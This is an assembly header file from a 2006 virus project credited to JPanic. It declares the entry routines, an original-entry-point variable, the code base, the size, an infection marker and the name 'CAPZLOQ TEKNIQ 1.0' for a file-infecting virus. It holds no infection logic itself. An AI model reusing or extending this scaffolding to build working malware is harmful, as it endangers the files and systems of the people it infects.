;= Virus Main Declarations (c) 2006 JPanic ================================
;
; Declarations:
;	VMain()
;	dwOrigEIP DWORD
;	VHost()
;
; Defines:
;	VCode
;	VSize
;	VMarker
;	VName
;
;- Directive Warez --------------------------------------------------------
		.486

include vheap.ash

;- Public Declarations ----------------------------------------------------
IFNDEF	_VMAIN_ASM
	extrn	VMain:PROC
	extrn	dwOrigEIP:PROC
        extrn   BuildVBody:PROC
ENDIF	;_VMAIN_ASM

IFNDEF	_VHOST_ASM
	extrn	VHost:PROC
ENDIF	;_VHOST_ASM

;- Virus Code Base --------------------------------------------------------
VCode	EQU	(VBase + 1000h)

;- Virus Size -------------------------------------------------------------
VSize	EQU     (ofs VHost - VCode)

;- Virus Marker -----------------------------------------------------------
VMarker	EQU	7DFBh

;- Virus Name -------------------------------------------------------------
VName 	EQU	"[CAPZLOQ TEKNIQ 1.0]"

;==========================================================================

